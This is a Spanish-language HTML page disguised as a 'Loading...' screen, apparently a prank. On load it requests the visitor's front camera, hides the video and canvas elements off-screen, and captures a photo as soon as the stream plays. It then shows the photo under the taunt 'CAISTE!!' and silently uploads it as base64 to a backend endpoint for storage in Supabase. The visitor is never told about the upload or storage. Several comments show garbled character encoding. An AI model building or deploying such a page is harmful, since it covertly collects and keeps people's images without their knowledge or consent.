<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000;
        }

        /* --- CAMBIO AQU√ç --- */
        /* Oculta los elementos de captura movi√©ndolos fuera de la pantalla
           en lugar de usar 'display: none', que puede causar problemas. */
        #video, #canvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
        }

        /* Pantalla de sorpresa */
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(180deg, #000000 0%, #8b0000 100%);
            opacity: 0;
            transition: opacity 0.5s ease-in;
            z-index: 10;
        }

        #overlay.visible {
            opacity: 1;
        }

        #overlay.hidden {
            display: none;
        }

        #foto-capturada {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 11;
        }

        #overlay h1 {
            font-family: Arial, sans-serif;
            font-size: 5vw;
            color: white;
            text-shadow: 2px 2px 4px #000;
            position: relative;
            z-index: 12;
        }
    </style>
</head>
<body>
    <video id="video" playsinline autoplay muted></video>
    <canvas id="canvas"></canvas>

    <div id="overlay" class="hidden">
        <img id="foto-capturada" src="" alt="Tu foto">
        <h1>CAISTE!!ü§£</h1>
    </div>

    <script>
        // --- CONFIGURACI√ìN ---
        const VERCEL_ENDPOINT_URL = "/api/guardar-imagen";
        // ---------------------

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const overlay = document.getElementById('overlay');
        const fotoCapturada = document.getElementById('foto-capturada');

        // 1. Solicitar acceso a la c√°mara
        async function iniciarCamara() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' } 
                });
                
                video.srcObject = stream;
                
                // --- ¬°¬°CAMBIO PRINCIPAL AQU√ç!! ---
                // Ya no usamos 'onloadedmetadata'.
                // Usamos el evento 'playing', que GARANTIZA que hay fotogramas.
                video.addEventListener('playing', () => {
                    console.log("¬°El video ha comenzado a reproducirse! Capturando...");
                    
                    // 1. Ajustar el tama√±o del canvas al del video
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // 2. Capturar la foto inmediatamente
                    // (Podemos a√±adir un peque√±√≠simo delay por si acaso, 
                    // pero 'playing' suele ser suficiente)
                    setTimeout(capturarFoto, 50); // 50ms es m√°s seguro que 0
                });

            } catch (err) {
                console.error("Error al acceder a la c√°mara:", err);
                overlay.innerHTML = "<h1>Error de c√°mara üò¢</h1>";
                overlay.classList.remove('hidden');
                overlay.classList.add('visible');
            }
        }

        // 2. Funci√≥n para tomar la foto (sin cambios)
        function capturarFoto() {
            // Asegurarse de que el canvas tenga un contexto
            const context = canvas.getContext('2d');
            if (!context) {
                console.error("No se pudo obtener el contexto 2D del canvas");
                return;
            }

            console.log("Dibujando imagen en canvas...");
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);

            // Verificaci√≥n: Si el dataUrl es muy corto, algo sali√≥ mal (ej. canvas vac√≠o)
            if (dataUrl.length < 1000) {
                console.warn("La imagen capturada parece estar vac√≠a (posiblemente negra).");
                // Podr√≠amos intentar capturar de nuevo, pero por ahora mostremos la falla
            }
            
            fotoCapturada.src = dataUrl;
            mostrarPantallaBroma();

            video.srcObject.getTracks().forEach(track => track.stop());

            const base64Data = dataUrl.split(',')[1];
            enviarAFirebase(base64Data);
        }

        // 4. Muestra la pantalla de broma (sin cambios)
        function mostrarPantallaBroma() {
            overlay.classList.remove('hidden');
            void overlay.offsetWidth; 
            overlay.classList.add('visible');
        }

        // 5. Env√≠a el Base64 al backend (sin cambios)
        async function enviarAFirebase(base64) {
            console.log("Enviando foto a Vercel...");
            try {
                const response = await fetch(VERCEL_ENDPOINT_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ base64: base64 }),
                });

                const result = await response.json();

                if (response.ok) {
                    console.log("¬°Foto guardada en Supabase con √©xito!", result);
                } else {
                    console.error("Error al guardar en Vercel/Supabase:", result.error);
                }

            } catch (err) {
                console.error("Error de red al enviar la foto:", err);
            }
        }

        // Inicia todo el proceso
        iniciarCamara();
    </script>
</body>
</html>
